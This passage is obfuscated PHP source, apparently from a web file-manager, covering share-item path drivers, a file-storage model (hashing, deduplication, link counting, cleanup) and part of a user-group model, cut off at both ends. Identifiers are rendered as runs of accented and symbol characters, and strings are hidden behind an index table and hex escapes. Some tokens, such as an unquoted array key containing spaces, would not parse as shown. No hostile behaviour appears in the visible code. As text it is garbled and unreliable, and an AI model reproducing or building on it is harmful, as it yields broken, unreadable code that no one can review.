Action($ô‚∏˚Ê»[1178])->shareItemInfo($Ä™…÷Å˙[$ô‚∏˚Ê»[1339]]); } foreach ($Ä™…÷Å˙ as $˜¬õÍƒ¬ => $çÜ∂ÁÇº) { if (!in_array($˜¬õÍƒ¬, array($ô‚∏˚Ê»[93], $ô‚∏˚Ê»[92]))) { continue; } foreach ($çÜ∂ÁÇº as $«Œüêû… => $É˙ö©Ø£) { $Ä™…÷Å˙[$˜¬õÍƒ¬][$«Œüêû…] = Action($ô‚∏˚Ê»[1178])->shareItemInfo($É˙ö©Ø£); } } return $Ä™…÷Å˙; } public function listAll($Å§Ôù˚∑) { $ÁÖ¥Ï¨ï =& $_SERVER[Á≈ ä ∞]; $‚üôñ‘ç = IO::info($this->pathParse[$ÁÖ¥Ï¨ï[94]]); if (!$‚üôñ‘ç) { return array(); } $‚∏«øãÄ = $this->model->listAll($Å§Ôù˚∑); foreach ($‚∏«øãÄ as &$¢ü™ÿÉ¢) { $¢ü™ÿÉ¢[$ÁÖ¥Ï¨ï[96]] = Action($ÁÖ¥Ï¨ï[1178])->shareItemInfo($¢ü™ÿÉ¢[$ÁÖ¥Ï¨ï[96]]); } unset($¢ü™ÿÉ¢); return $‚∏«øãÄ; } } class PathDriverDriverShareItem { public function __construct($¨ó«˜ó∫) { $this->pathParse = $¨ó«˜ó∫; } public function __call($§≈ﬂøÒô, $˜æÂáœπ) { $˜ëÖ≤É‡ =& $_SERVER[Á≈ ä ∞]; if (method_exists($this, $§≈ﬂøÒô)) { return; } $‡∞‡ò∑• = call_user_func_array(array($˜ëÖ≤É‡[1340], $§≈ﬂøÒô), $˜æÂáœπ); $Ô…Ø‹Ê∫ = array($˜ëÖ≤É‡[1341], $˜ëÖ≤É‡[1342], $˜ëÖ≤É‡[1343], $˜ëÖ≤É‡[1344], $˜ëÖ≤É‡[564], $˜ëÖ≤É‡[566], $˜ëÖ≤É‡[1345], $˜ëÖ≤É‡[117], $˜ëÖ≤É‡[1346], $˜ëÖ≤É‡[1347]); if (in_array($§≈ﬂøÒô, $Ô…Ø‹Ê∫)) { $‡∞‡ò∑• = $this->getPathOuter($‡∞‡ò∑•); } return $‡∞‡ò∑•; } public function copy($…Œ⁄’˜∆, $’¥Ô“„Ê, $â¨øåß™ = false, $ÎÆæÛ⁄ê = false) { return $this->copyMove($…Œ⁄’˜∆, $’¥Ô“„Ê, $â¨øåß™, $_SERVER[Á≈ ä ∞][564], $ÎÆæÛ⁄ê); } public function move($Êƒ¬…»í, $÷Ÿ∑ò€¨, $¢÷„√Ÿ” = false, $ã∂π‚Óÿ = false) { return $this->copyMove($Êƒ¬…»í, $÷Ÿ∑ò€¨, $¢÷„√Ÿ”, $_SERVER[Á≈ ä ∞][566], $ã∂π‚Óÿ); } private function copyMove($÷˙”¥Å«, $à∞ù‚À◊, $£Á®˙¯≠, $É’˚Í°ï, $◊ŸÀëÊ = false) { $˜à›æ±≥ =& $_SERVER[Á≈ ä ∞]; $‰‘ó‡© = $à∞ù‚À◊; $ÑÜÄõŸÆ = IO::driverMake($à∞ù‚À◊); if ($ÑÜÄõŸÆ->pathParse[$˜à›æ±≥[1154]]) { $à∞ù‚À◊ = $ÑÜÄõŸÆ->pathParse[$˜à›æ±≥[1154]]; } else { $à∞ù‚À◊ = $‰‘ó‡©; } $ﬂÑ˛œ‚ä = IO::copyMove($÷˙”¥Å«, $à∞ù‚À◊, $£Á®˙¯≠, $É’˚Í°ï, $◊ŸÀëÊ); $ﬂÑ˛œ‚ä = $this->getPathOuter($ﬂÑ˛œ‚ä); return $ﬂÑ˛œ‚ä; } public function pathThis($°û≤ƒ¥á) { return get_path_this($this->pathParse[$_SERVER[Á≈ ä ∞][94]]); } public function pathFather($Ç¥ØÑΩ‘) { return get_path_father($this->pathParse[$_SERVER[Á≈ ä ∞][94]]); } public function iconvSystem($¢…œüÿ˚) { return $¢…œüÿ˚; } protected function infoParse($ŸæëπÆÅ, $§Ø˘ùÖ∫ = false) { $ÅÒï«¡π =& $_SERVER[Á≈ ä ∞]; $ñÀ´∞⁄å = $this->pathParse[$ÅÒï«¡π[496]][$ÅÒï«¡π[1179]] . $this->pathParse[$ÅÒï«¡π[1172]]; if ($§Ø˘ùÖ∫) { $≥è„Ωøı = IO::infoWithChildren($ñÀ´∞⁄å); } else { $≥è„Ωøı = IO::info($ñÀ´∞⁄å); } $ñ‡ø¶Â´ = $this->pathParse[$ÅÒï«¡π[496]]; return Action($ÅÒï«¡π[1338])->_shareItemeParse($≥è„Ωøı, $ñ‡ø¶Â´); } public function listAll($âƒú£‡Ü) { $ÿ¥«∂⁄™ =& $_SERVER[Á≈ ä ∞]; $·‘Õõí› = IO::listAll($âƒú£‡Ü); $¯Œôœºñ = $this->pathParse[$ÿ¥«∂⁄™[496]]; foreach ($·‘Õõí› as &$è∏ô·¢≠) { check_abort(); $›ù¡®Ì˘ = IO::info($è∏ô·¢≠[$ÿ¥«∂⁄™[94]]); $›ù¡®Ì˘ = is_array($›ù¡®Ì˘) ? $›ù¡®Ì˘ : array(); $è∏ô·¢≠ = array_merge($›ù¡®Ì˘, $è∏ô·¢≠); $è∏ô·¢≠[$ÿ¥«∂⁄™[96]] = Action($ÿ¥«∂⁄™[1338])->_shareItemeParse($è∏ô·¢≠, $¯Œôœºñ); } unset($è∏ô·¢≠); return $·‘Õõí›; } public function getPathOuter($È‰É¡ñŒ) { $û¢¨àåÆ =& $_SERVER[Á≈ ä ∞]; $Ùª˛˘›© = KodIO::parse($È‰É¡ñŒ); if ($Ùª˛˘›©[$û¢¨àåÆ[43]] == KodIO::KOD_SHARE_ITEM) { return $Ùª˛˘›©[$û¢¨àåÆ[94]]; } $Œèí˚√¶ = KodIO::clear($È‰É¡ñŒ); $û≤ñ∫˝≤ = KodIO::clear($this->pathParse[$û¢¨àåÆ[496]][$û¢¨àåÆ[1179]]); $ﬂº–ﬂìë = substr($Œèí˚√¶, strlen($û≤ñ∫˝≤)); if (substr($Œèí˚√¶, 0, strlen($û≤ñ∫˝≤)) != $û≤ñ∫˝≤) { return !1; } return $this->pathParse[$û¢¨àåÆ[1173]] . $û¢¨àåÆ[18] . ltrim($ﬂº–ﬂìë, $û¢¨àåÆ[18]); } public function getType() { $·˜‡„…  =& $_SERVER[Á≈ ä ∞]; $Â˘‘àŒì = str_replace($·˜‡„… [84], $·˜‡„… [22], get_class($this)); return strtolower($Â˘‘àŒì); } public function isTypeObject($ã≤‹€Ÿ∆) { return IO::isTypeObject($ã≤‹€Ÿ∆); } public function info($Ç’Ôê±Ä) { return $this->infoParse($Ç’Ôê±Ä); } public function infoAuth($∆∆âÕåà) { return $this->infoParse($∆∆âÕåà); } public function infoWithChildren($ÅÛ‘§Ãô) { return $this->infoParse($ÅÛ‘§Ãô, !0); } public function infoFull($ñ’˙¨Å‡) { return $this->infoParse($ñ’˙¨Å‡); } } goto FÆﬁ™¶íÔÃ; FÏ¿‰ÂÓ…ë: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145\137\x63\x6f\156\x74\x65\156\164\x73"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\x73\x65\x72\164", "\146\x75\156\x63\164\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\x6d\x65" => "\151\157\137\146\x69\x6c\x65\137\x6d\145\164\x61", "\x6d\145\164\x61\x46\151\x65\x6c\144" => "\146\151\x6c\x65\111\x44"); public function fileInfo($Ê≥ò‹é∏) { $≈˝‘Í∏˜ =& $_SERVER[Á≈ ä ∞]; static $ì„¥ÖΩ› = array(); if (!isset($ì„¥ÖΩ›[$Ê≥ò‹é∏])) { $Õ¿Æ∑è£ = $≈˝‘Í∏˜[1879]; $‡Ò√é±Ô = Model($≈˝‘Í∏˜[480])->field($Õ¿Æ∑è£)->where(array($≈˝‘Í∏˜[478] => $Ê≥ò‹é∏))->find(); $ì„¥ÖΩ›[$Ê≥ò‹é∏] = $‡Ò√é±Ô; } return $ì„¥ÖΩ›[$Ê≥ò‹é∏]; } public function addFileByContent($·∫œå£î = '', $«´ÂºÙÀ = '') { $∑ÃÅ´™å =& $_SERVER[Á≈ ä ∞]; $üâ¯Ó•‡ = TEMP_PATH . $∑ÃÅ´™å[1880]; if (!is_dir($üâ¯Ó•‡)) { mk_dir($üâ¯Ó•‡); } $“è‰ßß∞ = $üâ¯Ó•‡ . $∑ÃÅ´™å[1881] . rand_string(16); file_put_contents($“è‰ßß∞, $·∫œå£î); $ü«ÉàÙ˙ = $this->addFile($“è‰ßß∞, $«´ÂºÙÀ, !0); if (file_exists($“è‰ßß∞)) { @unlink($“è‰ßß∞); } return $ü«ÉàÙ˙; } public function createFileName($¡˙∫ı“Ò, $˚êÌÛßÊ = false, $µßªà˛… = false) { $˙œ»˜ìµ =& $_SERVER[Á≈ ä ∞]; $£ë›Ùﬂª = IO::init($˙œ»˜ìµ[18]); $Ê√∏≈¡ﬁ = $this->makeFilePath($¡˙∫ı“Ò, $£ë›Ùﬂª, $˚êÌÛßÊ, $µßªà˛…); $Û«îŒ¡‡ = $£ë›Ùﬂª->pathFather($Ê√∏≈¡ﬁ); static $öãòüïÆ = false; $û‰ÉË‘¬ = $˙œ»˜ìµ[1882] . md5($Û«îŒ¡‡); if (!$öãòüïÆ && !Cache::get($û‰ÉË‘¬)) { $öãòüïÆ = !0; $≤€™‡˚º = IO::mkdir($Û«îŒ¡‡); if (!IO::exist($≤€™‡˚º . $˙œ»˜ìµ[804])) { IO::mkfile($≤€™‡˚º . $˙œ»˜ìµ[804]); } Cache::set($û‰ÉË‘¬, 1, 3600 * 2); } return $Ê√∏≈¡ﬁ; } public function makeFilePath($ÈõÄ≈ôì, $±ú◊πù, $Ë£Ê’öè = false, $ÎÂ§‚≈◊ = false) { $Ö§˘ì™ê =& $_SERVER[Á≈ ä ∞]; $∞Â◊ôÑí = Model($Ö§˘ì™ê[777])->get($Ö§˘ì™ê[1883]); $Èõ≥∞á≠ = KodIO::defaultIO() . date($Ö§˘ì™ê[1884]); $ü…ùŸÂ∏ = $Èõ≥∞á≠ . rand_string(5) . short_id(100); $ÈõÄ≈ôì = str_replace($Ö§˘ì™ê[18], $Ö§˘ì™ê[21], KodIO::clear($ÈõÄ≈ôì)); $◊«√˘≠¯ = $±ú◊πù->ext($ÈõÄ≈ôì); if (!$ÈõÄ≈ôì) { $∞Â◊ôÑí = $Ö§˘ì™ê[1885]; } switch ($∞Â◊ôÑí) { case $Ö§˘ì™ê[1886]: $ü…ùŸÂ∏ = $ü…ùŸÂ∏ . $Ö§˘ì™ê[20] . $±ú◊πù->ext($ÈõÄ≈ôì); if ($◊«√˘≠¯ == $Ö§˘ì™ê[1823]) { $ü…ùŸÂ∏ .= $Ö§˘ì™ê[1553]; } break; case $Ö§˘ì™ê[1887]: $üå€ô˝† = Model($Ö§˘ì™ê[777])->get($Ö§˘ì™ê[778]); $¨ÖüÈŸ÷ = substr(md5($Ö§˘ì™ê[779] . $üå€ô˝† . date($Ö§˘ì™ê[755])), 0, 8); $èñ—¿ºá = KodIO::defaultDriver(); $Èõ≥∞á≠ = $Ö§˘ì™ê[1232] . $èñ—¿ºá[$Ö§˘ì™ê[408]] . $Ö§˘ì™ê[418] . date($Ö§˘ì™ê[1888]) . $¨ÖüÈŸ÷ . $Ö§˘ì™ê[18]; if ($◊«√˘≠¯ == $Ö§˘ì™ê[1823]) { $ÈõÄ≈ôì .= $Ö§˘ì™ê[1553]; } $É¿…é∞∏ = $Ö§˘ì™ê[1889] . $Èõ≥∞á≠ . $ÈõÄ≈ôì; CacheLock::lock($É¿…é∞∏); $ü…ùŸÂ∏ = $Èõ≥∞á≠ . $ÈõÄ≈ôì; if (IO::exist($Èõ≥∞á≠ . $ÈõÄ≈ôì)) { $Á≤øÿÉÎ = substr($ÈõÄ≈ôì, 0, strlen($ÈõÄ≈ôì) - strlen($◊«√˘≠¯)); $Íí±œ„ = $ÎÂ§‚≈◊ ? substr($ÎÂ§‚≈◊, 0, 5) : ($Ë£Ê’öè ? substr($Ë£Ê’öè, 0, 5) : rand_string(5)); $ü…ùŸÂ∏ = $Èõ≥∞á≠ . $Á≤øÿÉÎ . $Íí±œ„ . $Ö§˘ì™ê[20] . $◊«√˘≠¯; } if (IO::isTypeObject($ü…ùŸÂ∏) && !IO::isUploadServer($ü…ùŸÂ∏)) { if (IO::exist($ü…ùŸÂ∏)) { return $ü…ùŸÂ∏; } $ÆıáÈ‹ñ = IO::setContent($ü…ùŸÂ∏, $Ö§˘ì™ê[22]); if (!$ÆıáÈ‹ñ) { show_json($Ö§˘ì™ê[1890], !1); } } CacheLock::unlock($É¿…é∞∏); break; case $Ö§˘ì™ê[1885]: break; default: break; } return $ü…ùŸÂ∏; } public function addFileByRemote($ãä¨¶∂Ä, $ì∏‹Á¸°, $Ë·û ó„ = array()) { $ñ÷£ªœ‹ =& $_SERVER[Á≈ ä ∞]; if (!IO::exist($ãä¨¶∂Ä)) { return !1; } $’Ù∫ñ§Ñ = $Ë·û ó„[$ñ÷£ªœ‹[186]] ? $Ë·û ó„[$ñ÷£ªœ‹[186]] : $ñ÷£ªœ‹[22]; $±ÌÓ–°â = IO::hashMd5($ãä¨¶∂Ä, $’Ù∫ñ§Ñ); $ôÀÇº∞… = KodIO::defaultDriver(); $ÔÀ◊±√» = array($ñ÷£ªœ‹[594] => IO::size($ãä¨¶∂Ä), $ñ÷£ªœ‹[1891] => 1, $ñ÷£ªœ‹[429] => $ì∏‹Á¸°, $ñ÷£ªœ‹[815] => $ôÀÇº∞…[$ñ÷£ªœ‹[408]], $ñ÷£ªœ‹[430] => $ãä¨¶∂Ä, $ñ÷£ªœ‹[1892] => $Ë·û ó„[$ñ÷£ªœ‹[187]] ? $Ë·û ó„[$ñ÷£ªœ‹[187]] : IO::hashSimple($ãä¨¶∂Ä), $ñ÷£ªœ‹[1893] => $±ÌÓ–°â ? $±ÌÓ–°â : $’Ù∫ñ§Ñ); if ($˙ µÎ¨ü = $this->addFileCheckExist($ÔÀ◊±√»[$ñ÷£ªœ‹[187]], $ÔÀ◊±√»[$ñ÷£ªœ‹[186]], $ÔÀ◊±√»[$ñ÷£ªœ‹[86]])) { return $˙ µÎ¨ü; } return $this->addFileData($ÔÀ◊±√»); } private function addFileData($ç∞ûÀ‡å) { $ı©‰Ç€‰ =& $_SERVER[Á≈ ä ∞]; if (!$ç∞ûÀ‡å) { return !1; } $ç∞ûÀ‡å[$ı©‰Ç€‰[86]] = intval($ç∞ûÀ‡å[$ı©‰Ç€‰[86]]); if (!$ç∞ûÀ‡å[$ı©‰Ç€‰[86]] && strlen($ç∞ûÀ‡å[$ı©‰Ç€‰[187]]) > 32) { $ç∞ûÀ‡å[$ı©‰Ç€‰[86]] = intval(substr($ç∞ûÀ‡å[$ı©‰Ç€‰[187]], 32)); } $ó¥ßû≈™ = $this->add($ç∞ûÀ‡å); return $this->find($ó¥ßû≈™); } public function addFile($ﬂÌ…Ë°ï, $Èﬁí≈ù∑, $¸ê¿Üãµ = false) { $†ÎßÎâ∫ =& $_SERVER[Á≈ ä ∞]; $áÖÍÅﬂè = IO::hashSimple($ﬂÌ…Ë°ï); $ªÆ”Û‡Ç = IO::size($ﬂÌ…Ë°ï); $Ã´Ëà‰‹ = $ªÆ”Û‡Ç <= 1024 * 1024 * 10 ? IO::hashMd5($ﬂÌ…Ë°ï) : $†ÎßÎâ∫[22]; $£Ê∑∏‰å = $†ÎßÎâ∫[1894] . $áÖÍÅﬂè; CacheLock::lock($£Ê∑∏‰å); if ($Ã´Ëà‰‹ && $áÖÍÅﬂè) { $àÌÈäµ◊ = $this->addFileCheckExist($áÖÍÅﬂè, $Ã´Ëà‰‹, $ªÆ”Û‡Ç); if ($àÌÈäµ◊) { CacheLock::unlock($£Ê∑∏‰å); return $àÌÈäµ◊; } } $Áõﬁœ÷º = $this->addFileMake($ﬂÌ…Ë°ï, $ªÆ”Û‡Ç, $áÖÍÅﬂè, $Ã´Ëà‰‹, $Èﬁí≈ù∑, $¸ê¿Üãµ); $®›ËèÕÒ = $this->addFileData($Áõﬁœ÷º); CacheLock::unlock($£Ê∑∏‰å); if (!$Ã´Ëà‰‹ && $®›ËèÕÒ) { $this->fileMd5Check($®›ËèÕÒ); } return $®›ËèÕÒ; } private function fileMd5Check($È©ÊÀº’) { $Öûı•òÂ =& $_SERVER[Á≈ ä ∞]; $ÉúÜ∏õ¯ = array($È©ÊÀº’[$Öûı•òÂ[477]], $È©ÊÀº’[$Öûı•òÂ[94]]); $ùØ†’Êû = $Öûı•òÂ[1895] . $È©ÊÀº’[$Öûı•òÂ[94]]; $ºùŒﬂÿ¨ = $Öûı•òÂ[1896] . $È©ÊÀº’[$Öûı•òÂ[477]]; $Ôú◊Ê¨Ñ = TaskQueue::add($Öûı•òÂ[1897], $ÉúÜ∏õ¯, $ùØ†’Êû, $ºùŒﬂÿ¨); if (!$Ôú◊Ê¨Ñ) { $this->fileMd5Set($È©ÊÀº’[$Öûı•òÂ[477]], $È©ÊÀº’[$Öûı•òÂ[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($‘¬‰€˘˝, $ıå¿»Á‡) { $„¨¸«É÷ =& $_SERVER[Á≈ ä ∞]; $’∞˛ª˝¡ = $this->find($‘¬‰€˘˝); if (!$’∞˛ª˝¡ || $’∞˛ª˝¡[$„¨¸«É÷[186]]) { return; } $Ω≥àìï§ = IO::hashMd5($ıå¿»Á‡); if (!$Ω≥àìï§) { return $„¨¸«É÷[22]; } $this->where(array($„¨¸«É÷[477] => $‘¬‰€˘˝))->save(array($„¨¸«É÷[186] => $Ω≥àìï§)); } public function addFileMake($Ì∏÷î√Ì, $ªÑãòÈ‹, $™≥ü£√°, $ÀÒèËõô, $ıåßÃúö, $Î•àòØÈ) { $Ê¬∫«ıª =& $_SERVER[Á≈ ä ∞]; $Å≥ﬁéäô = $this->createFileName($ıåßÃúö, $™≥ü£√°, $ÀÒèËõô); $€≠Üøµô = get_path_father($Å≥ﬁéäô); $‹ÛäÎãé = get_path_this($Å≥ﬁéäô); if ($Î•àòØÈ) { $Ñæ¥Õÿﬂ = IO::move($Ì∏÷î√Ì, $€≠Üøµô, !1, $‹ÛäÎãé); } else { $Ñæ¥Õÿﬂ = IO::copy($Ì∏÷î√Ì, $€≠Üøµô, !1, $‹ÛäÎãé); } if (!$Ñæ¥Õÿﬂ) { return !1; } $ãö”◊ﬁ˙ = KodIO::defaultDriver(); $Ô¨’Å‰‡ = array($Ê¬∫«ıª[594] => $ªÑãòÈ‹, $Ê¬∫«ıª[1891] => 1, $Ê¬∫«ıª[429] => $ıåßÃúö, $Ê¬∫«ıª[815] => $ãö”◊ﬁ˙[$Ê¬∫«ıª[408]], $Ê¬∫«ıª[430] => $Å≥ﬁéäô, $Ê¬∫«ıª[1892] => $™≥ü£√°, $Ê¬∫«ıª[1893] => $ÀÒèËõô); return $Ô¨’Å‰‡; } public function addFileCheckExist($â‰Ò‚Ú—, $◊ﬁ„Ì¨Ï, $Ü¡ß˛ﬁø) { $ı†·ˆ§á =& $_SERVER[Á≈ ä ∞]; $«øÉ©°” = $this->findByHash($â‰Ò‚Ú—, $◊ﬁ„Ì¨Ï); if (!$«øÉ©°”) { return !1; } $®”ñ¯Ö€ = array($ı†·ˆ§á[1891] => intval($«øÉ©°”[$ı†·ˆ§á[1898]]) + 1, $ı†·ˆ§á[594] => $Ü¡ß˛ﬁø); $this->where(array($ı†·ˆ§á[478] => $«øÉ©°”[$ı†·ˆ§á[477]]))->save($®”ñ¯Ö€); return $«øÉ©°”; } public function remove($◊∑ÿıÇÓ) { $this->linkCountChange($◊∑ÿıÇÓ, !1); $this->clearEmpty(); return !0; } public function linkAdd($–ó”¬±) { $this->linkCountChange($–ó”¬±, !0); } public function linkCountChange($√˜Í—Èß, $ΩÚ˘öçœ) { $¥çƒôó… =& $_SERVER[Á≈ ä ∞]; if (!$√˜Í—Èß) { return; } if (!is_array($√˜Í—Èß)) { $√˜Í—Èß = array($√˜Í—Èß); } $Õìñøàâ = array(); foreach ($√˜Í—Èß as $ª§Øÿ«Œ) { $¿ñ–˜çﬁ = $ª§Øÿ«Œ . $¥çƒôó…[22]; if (!$Õìñøàâ[$¿ñ–˜çﬁ]) { $Õìñøàâ[$¿ñ–˜çﬁ] = 0; } $Õìñøàâ[$¿ñ–˜çﬁ]++; } $ª›ﬂ¿“˜ = array(); foreach ($Õìñøàâ as $ª§Øÿ«Œ => $ªÚﬂïéÙ) { $¿ñ–˜çﬁ = $ªÚﬂïéÙ . $¥çƒôó…[22]; if (!$ª›ﬂ¿“˜[$¿ñ–˜çﬁ]) { $ª›ﬂ¿“˜[$¿ñ–˜çﬁ] = array(); } $ª›ﬂ¿“˜[$¿ñ–˜çﬁ][] = $ª§Øÿ«Œ; } foreach ($ª›ﬂ¿“˜ as $ªÚﬂïéÙ => $∏¶¢§ƒ) { if (!$∏¶¢§ƒ) { continue; } $ªÚﬂïéÙ = $ΩÚ˘öçœ ? $ªÚﬂïéÙ : -intval($ªÚﬂïéÙ); $êüé”Ì« = array($¥çƒôó…[477] => array($¥çƒôó…[17], $∏¶¢§ƒ)); if ($ªÚﬂïéÙ < 0) { $êüé”Ì«[$¥çƒôó…[1898]] = array($¥çƒôó…[1018], abs($ªÚﬂïéÙ)); } $this->where($êüé”Ì«)->setAdd($¥çƒôó…[1898], $ªÚﬂïéÙ); } } public function findByHash($çêª´ø≈, $„Éπç≥ˆ = false) { $¿√ÉÌèõ =& $_SERVER[Á≈ ä ∞]; if (!$çêª´ø≈ && !$„Éπç≥ˆ) { return !1; } $êûñù¸§ = array($¿√ÉÌèõ[1892] => $çêª´ø≈); if ($„Éπç≥ˆ) { $êûñù¸§ = array($¿√ÉÌèõ[1893] => $„Éπç≥ˆ); } return $this->order($¿√ÉÌèõ[1899])->where($êûñù¸§)->find(); } public function clearEmpty($–´ü‚∏ñ = 0) { $Æıßñ∫Ç =& $_SERVER[Á≈ ä ∞]; $ÙÉ√ªô∆ = time() - 3600 * 24 * $–´ü‚∏ñ; $ü–ÒÈØ§ = $Æıßñ∫Ç[1900] . $ÙÉ√ªô∆; $Ô“Çœî = $this->where($ü–ÒÈØ§)->select(); if (!$Ô“Çœî) { return; } $ê¸»Îøå = new Task($Æıßñ∫Ç[1901], $Æıßñ∫Ç[22], count($Ô“Çœî)); foreach ($Ô“Çœî as $»üöªÂ¡) { $ê¸»Îøå->update(1); $this->resetFile($»üöªÂ¡); } $ê¸»Îøå->end(); } public function resetFile($∫˙±êíâ) { $Ø∂¢Âå˜ =& $_SERVER[Á≈ ä ∞]; $™…°ØŸ¯ = array($Ø∂¢Âå˜[478] => $∫˙±êíâ[$Ø∂¢Âå˜[477]]); $°µÒ¥‚ª = Model($Ø∂¢Âå˜[1330])->where($™…°ØŸ¯)->count(); $°⁄ŒÑ°— = Model($Ø∂¢Âå˜[1902])->where($™…°ØŸ¯)->count(); $ä®ÿ≤ìè = intval($°µÒ¥‚ª) + intval($°⁄ŒÑ°—); if ($ä®ÿ≤ìè == 0) { IO::remove($∫˙±êíâ[$Ø∂¢Âå˜[94]]); Model($Ø∂¢Âå˜[1903])->delete($∫˙±êíâ[$Ø∂¢Âå˜[477]]); $this->where($™…°ØŸ¯)->delete(); $this->metaSet($∫˙±êíâ[$Ø∂¢Âå˜[477]], null, null); return; } if ($∫˙±êíâ[$Ø∂¢Âå˜[1898]] != $ä®ÿ≤ìè) { $this->where($™…°ØŸ¯)->save(array($Ø∂¢Âå˜[1891] => $ä®ÿ≤ìè)); } } public function storageInfo($∞êÔÂµ… = false) { $£¨«∂ø‹ =& $_SERVER[Á≈ ä ∞]; $É™›ïÖ≤ = $this->count() + 0.0; $ÁùÂƒè˙ = 0; $»◊«Îˆ· = 1; $¡≥–í˜° = 0; $÷•≠˜µ¯ = 5000; for ($‘Ä„êü€ = 0; $‘Ä„êü€ < $É™›ïÖ≤; $‘Ä„êü€ = $‘Ä„êü€ + $÷•≠˜µ¯) { $∑÷∆±ˆ– = $this->limit($‘Ä„êü€, $‘Ä„êü€ + $÷•≠˜µ¯)->select(); foreach ($∑÷∆±ˆ– as $Ω›“∂˛Ö) { $»◊«Îˆ· += $Ω›“∂˛Ö[$£¨«∂ø‹[86]] * $Ω›“∂˛Ö[$£¨«∂ø‹[1898]]; $ÁùÂƒè˙ += $Ω›“∂˛Ö[$£¨«∂ø‹[86]] * ($Ω›“∂˛Ö[$£¨«∂ø‹[1898]] - 1); $¡≥–í˜° += $Ω›“∂˛Ö[$£¨«∂ø‹[1898]]; } } $ÔÜ≥úÇ… = array($£¨«∂ø‹[1904] => $»◊«Îˆ·, $£¨«∂ø‹[1905] => $ÁùÂƒè˙, $£¨«∂ø‹[1906] => $ÁùÂƒè˙ / $»◊«Îˆ·, $£¨«∂ø‹[90] => $É™›ïÖ≤, $£¨«∂ø‹[1907] => $¡≥–í˜°); return $ÔÜ≥úÇ…; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\x6d\x65" => "\x67\162\157\x75\160\137\155\145\164\x61", "\155\x65\x74\x61\106\x69\x65\154\x64" => "\147\162\157\165\160\111\104"); protected function cacheFunctionAlias($Ò©ËÄ÷Ó) { $Ùî£∞ƒ =& $_SERVER[Á≈ ä ∞]; return array($Ùî£∞ƒ[1908] => array($Ò©ËÄ÷Ó[0], $Ùî£∞ƒ[1909]), $Ùî£∞ƒ[1910] => array($Ò©ËÄ÷Ó[0], $Ùî£∞ƒ[1911])); } protected function getInfo($Æÿ˜∏é , $Õˆ›œ“¸ = false) { $¸±ÿÂ‡§ = $this->getInfoSimple($Æÿ˜∏é ); if (!$¸±ÿÂ‡§) { return !1; } if ($Õˆ›œ“¸) { return $this->_listDataApplyItem($¸±ÿÂ‡§); } return $this->cacheFunctionGet($_SERVER[Á≈ ä ∞][1912], $Æÿ˜∏é ); } protected function getInfoSimple($§¥úã´«, $º…Ω∂±ƒ = false) { $≥ö≤®ÈÖ =& $_SERVER[Á≈ ä ∞]; if ($º…Ω∂±ƒ) { $π‰Ω«÷∏ = array($≥ö≤®ÈÖ[1830] => intval($§¥úã´«)); $∞»°ıÛß = $this->where($π‰Ω«÷∏)->find(); return is_array($∞»°ıÛß) ? $∞»°ıÛß : array(); } return $this->cacheFunctionGet($≥ö≤®ÈÖ[1913], $§¥úã´«); } protected function groupAdd($∏ÅÒˆµ˛) { $ÿù¥⁄È· =& $_SERVER[Á≈ ä ∞]; if (!$∏ÅÒˆµ˛[$ÿù¥⁄È·[441]] && isset($∏ÅÒˆµ˛[$ÿù¥⁄È·[1830]]) && $∏ÅÒˆµ˛[$ÿù¥⁄È·[1830]] == 1) { if ($æ◊°î¿≠ = $this->getInfoSimple($∏ÅÒˆµ˛[$ÿù¥⁄È·[1830]], !0)) { return $∏ÅÒˆµ˛[$ÿù¥⁄È·[1830]]; } } else { $æ◊°î¿≠ = $this->getInfoSimple($∏ÅÒˆµ˛[$ÿù¥⁄È·[441]]); if (!$æ◊°î¿≠) { return !1; } } $≥∑∞ƒÎÙ = $ÿù¥⁄È·[540]; if ($æ◊°î¿≠[$ÿù¥⁄È·[530]]) { $≥∑∞ƒÎÙ = $æ◊°î¿≠[$ÿù¥⁄È·[530]] . $æ◊°î¿≠[$ÿù¥⁄È·[1830]] . $ÿù¥⁄È·[60]; } $“ò”ò®¬ = array($ÿù¥⁄È·[429] => $this->groupNameAuto($∏ÅÒˆµ˛[$ÿù¥⁄È·[441]], $∏ÅÒˆµ˛[$ÿù¥⁄È·[42]]), $ÿù¥⁄È·[410] => $∏ÅÒˆµ˛[$ÿù¥⁄È·[441]], $ÿù¥⁄È·[599] => $≥∑∞ƒÎÙ, $ÿù¥⁄È·[1914] => $∏ÅÒˆµ˛[$ÿù¥⁄È·[1817]], $ÿù¥⁄È·[1915] => 0, $ÿù¥⁄È·[1834] => 0); if (isset($∏ÅÒˆµ˛[$ÿù¥⁄È·[1854]])) { $“ò”ò®¬[$ÿù¥⁄È·[1854]] = $∏ÅÒˆµ˛[$ÿù¥⁄È·[1854]]; } else { $åà´≈¸ = $this->max($ÿù¥⁄È·[1854]); if (!$åà´≈¸) { $åà´≈¸ = 0; } $“ò”ò®¬[$ÿù¥⁄È·[1854]] = $åà´≈¸ + 1; } if (!empty($∏ÅÒˆµ˛[$ÿù¥⁄È·[1830]])) { $“ò”ò®¬[$ÿù¥⁄È·[1830]] = $∏ÅÒˆµ˛[$ÿù¥⁄È·[1830]]; } $π´·‚Õ∫ = $this->add($“ò”ò®¬); $this->setNamePinyin($π´·‚Õ∫, $“ò”ò®¬[$ÿù¥⁄È·[42]]); if (isset($∏ÅÒˆµ˛[$ÿù¥⁄È·[1916]])) { $this->metaSet($π´·‚Õ∫, array($ÿù¥⁄È·[1916] => $∏ÅÒˆµ˛[$ÿù¥⁄È·[1916]], $ÿù¥⁄È·[1917] => $∏ÅÒˆµ˛[$ÿù¥⁄È·[1917]])); unset($∏ÅÒˆµ˛[$ÿù¥⁄È·[1916]]); unset($∏ÅÒˆµ˛[$ÿù¥⁄È·[1917]]); } Model($ÿù¥⁄È·[1330])->groupRootAdd($π´·‚Õ∫); return $π´·‚Õ∫; } protected function groupEdit($ ˚≥±£â, $‰áïÄ˘∞) { $ä—¿áòœ =& $_SERVER[Á≈ ä ∞]; $ñ∞∞ﬂ¯ˆ = $this->getInfoSimple($ ˚≥±£â); if (!$ñ∞∞ﬂ¯ˆ) { return !1; } if 